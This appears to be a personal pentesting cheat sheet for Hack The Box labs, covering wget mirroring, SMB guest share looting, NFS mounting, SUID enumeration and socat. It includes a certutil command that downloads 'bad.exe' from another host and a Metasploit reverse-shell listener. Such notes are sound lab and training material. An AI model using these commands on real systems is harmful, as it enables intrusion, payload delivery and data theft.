
------------------------------------------------------------------------WgetCralwing------------------------------------------------------------------------
wget --no-clobber --convert-links --random-wait -r -p -c -b --level 1 -E -e robots=off -U mozilla --header="Referer: http://linuxsecrets.com/" --header="Accept-Encoding: compress, gzip" http://dumps.wikimedia.org/dewiki/20140528/

-b: runs it in background and cant see progress
-c: continue getting a partially-downloaded file.  This is useful when you want to finish up a download started by a previous instance of Wget, or by another program
-e: robots=off: act like we are not a robot - not like a crawler - websites dont like robots/crawlers unless they are google/or other famous search engine
-E: gets the right extension of the file, without most html and other files have no extension
-p: get all the page requisites. e.g. get all the image/css/js files linked from the page.
-r: ecursive - downloads full website
-U: pretends to be just like a browser Mozilla is looking at a page instead of a crawler like wget

-nd: do not create a hierarchy of directories when retrieving recursively. With this option turned on, all files will get saved to the current directory, without clobbering
-np: wget will not follow links up the url. e.g. it will not follow a link from devopsa.net/linux/curl.html to devopsa.net/linux.html

--connect-timeout: Set the connect timeout to seconds seconds.  TCP connections that take longer to establish will be aborted
--convert-links: convert links so that they work locally, off-line, instead of pointing to a website online
--limit-rate: imit download speed
--no-clobber: don't overwrite any existing files (used in case the download is interrupted and resumed)
--random-wait: random waits between download
--restrict-file-names: change which characters found in remote URLs must be escaped during generation of local filenames
--spider: wget will behave as a Web spider, which means that it will not download the pages, just check that they are there
--tries: set number of retries to number
--user-agent: identify as agent-string to the HTTP server


--------------------------------------------------------------------------------------SMB(139/445)--------------------------------------------------------------------------------------
smbmap -u "guest" -p "" -P 445 -H 10.10.11.174

smbclient //10.10.11.174/support-tools –U guest -A

smbclient '//10.10.11.174/support-tools' –U guest -A -N -c 'prompt OFF;recurse ON;cd '.';lcd '/home/anhndt/htb/support.htb/';mget *'`

smbclient '\\server\share'
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *

mask "";recurse ON;prompt OFF;mget * #==>> download all Recurse and not Prompt

--------------------------------------------------------------------------------------Windows--------------------------------------------------------------------------------------
-Native cmdlet:
	-Download file: certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
-Msf:
	msfconsole -x "use exploit/multi/handler;set payload windows/shell_reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"




-----------------------------------------------------------------------------------Unclassified---------------------------------------------------------------------------------

	- Find all owner ship:  find / -user michael 2>/dev/null
							find / -group security 2>/dev/null
							find / -group security -ls 2>/dev/null
							find / -type d -perm -o+w
							find / -perm -4000 2>/dev/null
								/usr/bin/su
								/usr/bin/sudo
								/usr/bin/mount
								/usr/bin/umount
								/usr/bin/newgrp
								/usr/bin/passwd
								/usr/bin/gpasswd
								/usr/bin/chsh
								/usr/bin/chfn
								/usr/bin/pkexec
								/usr/bin/fusermount3
								/usr/sbin/exim4
								/usr/sbin/pppd
							
							find / -user 1007 -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
							find / -type d -perm -o+w -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
							find / -user root -perm '600' -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
							
							find / -name *.txt 2>/dev/null
							
							
							cmd /r dir /a-r-d /s /b
							
	- Bash Script:
		[[$var == $var2]] ==> expression compare instead of string compare  $(var) `var`
		[[]] context ???
		
	- zip:
		zip -r nmap.zip nmap 
		Expand-Archive .\nmap.zip .\ ==> windows extract
		
	
	- Snipping packet:
		tcpdump -i ens192 udp -vvv
		
	- socat
		echo "BreakfastVikings999" | socat - UNIX-CONNECT:/tmp/s #==> skylark 12
		nc -lU <socket path>
		socat - UNIX-LISTEN:<socket path>
		
-----------------------------------------------------------------------------------------------------------------------------------------------------------------


111 - Portmapper ref:https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind
	sudo nmap -sSUC -p111 clicker.htb
	rpcinfo clicker.htb
	nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 10.10.11.232
	showmount -e 10.10.11.232
		Export list for 10.10.11.232:
		/mnt/backups *
	sudo mount -t nfs -o vers=3 10.10.11.232:/mnt/backups /mnt/mntclicker -o nolock
	cp clicker.htb_backup.zip /home/kali/stuffs/htb/clicker.htb/
	7z x clicker.htb_backup.zip
	
	

	
	
	
